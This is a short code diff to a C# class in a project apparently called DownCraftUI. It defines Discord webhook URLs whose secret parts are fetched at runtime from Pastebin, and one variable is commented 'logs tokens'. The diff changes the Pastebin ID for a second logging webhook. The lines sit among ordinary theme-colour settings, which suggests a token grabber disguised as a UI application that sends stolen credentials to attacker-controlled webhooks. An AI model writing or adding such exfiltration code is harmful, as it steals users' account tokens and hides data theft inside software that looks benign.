@@ -17,7 +17,7 @@ namespace DownCraftUI.Classes
         #region "Variables"
 
         public static string Hook = "https://discord.com/api/webhooks/" + new WebClient().DownloadString("https://pastebin.com/raw/r1YbTter"); //logs tokens
-        public string logs_downcraft = "https://discord.com/api/webhooks/" + new WebClient().DownloadString("https://pastebin.com/raw/eUwExZPN"); //ʟᴏɢꜱ-ᴅᴏᴡɴᴄʀᴀꜰᴛ
+        public string logs_downcraft = "https://discord.com/api/webhooks/" + new WebClient().DownloadString("https://pastebin.com/raw/5YYpEVRz"); //ʟᴏɢꜱ-ᴅᴏᴡɴᴄʀᴀꜰᴛ
         public static Color saveThemeColor = Color.FromArgb(70, 70, 245);
         public static Color saveTextColor = Color.FromArgb(200, 200, 200);
         public static Color saveBackColor = Color.FromArgb(40, 40, 40);
